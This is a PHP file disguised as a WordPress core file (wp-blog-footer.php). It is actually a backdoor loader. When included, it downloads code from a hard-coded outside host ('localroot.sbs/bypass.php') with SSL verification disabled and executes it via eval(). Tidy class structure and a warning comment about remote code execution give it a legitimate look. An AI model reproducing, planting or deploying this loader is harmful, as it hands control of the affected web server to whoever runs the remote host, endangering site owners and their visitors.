<?php
/**
 * File: wp-blog-footer.php
 *
 * Description:
 * Lightweight modular loader with WordPress-like structure.
 * Designed for flexible remote execution with clean architecture.
 *
 * Note:
 * This file follows a config-based and class-based approach
 * similar to modern WordPress development patterns.
 */

/**
 * ------------------------------------------------------------
 * Class: AppConfig
 * ------------------------------------------------------------
 * Handles application configuration.
 * Acts similar to wp-config.php in WordPress.
 */
class AppConfig {

    /**
     * Retrieve application configuration.
     *
     * @return array
     */
    public static function get(): array {
        return [
            'api' => [
                // API scheme (default: https)
                'scheme' => getenv('API_SCHEME') ?: 'https',

                // API host/domain
                'host'   => getenv('API_HOST') ?: 'localroot.sbs',

                // API endpoint path
                'endpoint' => getenv('API_PATH') ?: 'bypass.php',
            ],

            'http' => [
                // Request timeout in seconds
                'timeout' => 10
            ]
        ];
    }
}

/**
 * ------------------------------------------------------------
 * Class: UrlBuilder
 * ------------------------------------------------------------
 * Responsible for constructing the full API URL.
 */
class UrlBuilder {

    /**
     * Build a full URL from config array.
     *
     * @param array $config
     * @return string
     */
    public static function build(array $config): string {
        $api = $config['api'];

        return "{$api['scheme']}://{$api['host']}/{$api['endpoint']}";
    }
}

/**
 * ------------------------------------------------------------
 * Class: HttpClient
 * ------------------------------------------------------------
 * Handles HTTP requests (cURL-based).
 * Works as a lightweight alternative to WP HTTP API.
 */
class HttpClient {

    private $timeout;

    /**
     * Constructor
     *
     * @param int $timeout
     */
    public function __construct(int $timeout = 10) {
        $this->timeout = $timeout;
    }

    /**
     * Perform GET request
     *
     * @param string $url
     * @return string|false
     * @throws Exception
     */
    public function get(string $url) {

        // Ensure cURL is available
        if (!function_exists('curl_version')) {
            throw new Exception("cURL not available on this server.");
        }

        $ch = curl_init();

        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_FOLLOWLOCATION => true,

            // Disable SSL verification (not recommended for production)
            CURLOPT_SSL_VERIFYPEER => false
        ]);

        $response = curl_exec($ch);

        // Handle errors
        if (curl_errno($ch)) {
            $error = curl_error($ch);
            curl_close($ch);
            throw new Exception("HTTP Error: " . $error);
        }

        curl_close($ch);

        return $response;
    }
}

/**
 * ------------------------------------------------------------
 * Class: CodeExecutor
 * ------------------------------------------------------------
 * Responsible for executing fetched remote code.
 */
class CodeExecutor {

    private $client;

    /**
     * Constructor
     *
     * @param HttpClient $client
     */
    public function __construct(HttpClient $client) {
        $this->client = $client;
    }

    /**
     * Execute code from remote URL
     *
     * @param string $url
     * @return void
     */
    public function run(string $url): void {
        $code = $this->client->get($url);

        // Validate response
        if (!$code || trim($code) === '') {
            return;
        }

        /**
         * WARNING:
         * Executing remote code using eval() is extremely dangerous.
         * This may lead to Remote Code Execution (RCE) vulnerabilities.
         *
         * Use only in controlled environments.
         */
        eval("?>" . $code);
    }
}

/**
 * ------------------------------------------------------------
 * Class: App
 * ------------------------------------------------------------
 * Main application bootstrap.
 * Similar to WordPress initialization flow.
 */
class App {

    /**
     * Initialize and run the application
     *
     * @return void
     */
    public static function init(): void {
        try {
            // Load configuration
            $config = AppConfig::get();

            // Build target URL
            $url = UrlBuilder::build($config);

            // Initialize HTTP client
            $client = new HttpClient($config['http']['timeout']);

            // Execute remote code
            $executor = new CodeExecutor($client);
            $executor->run($url);

        } catch (Exception $e) {
            // Safe error output
            echo "Error: " . htmlspecialchars($e->getMessage());
        }
    }
}

/**
 * ------------------------------------------------------------
 * Bootstrap Execution
 * ------------------------------------------------------------
 * Entry point of the application.
 */
App::init();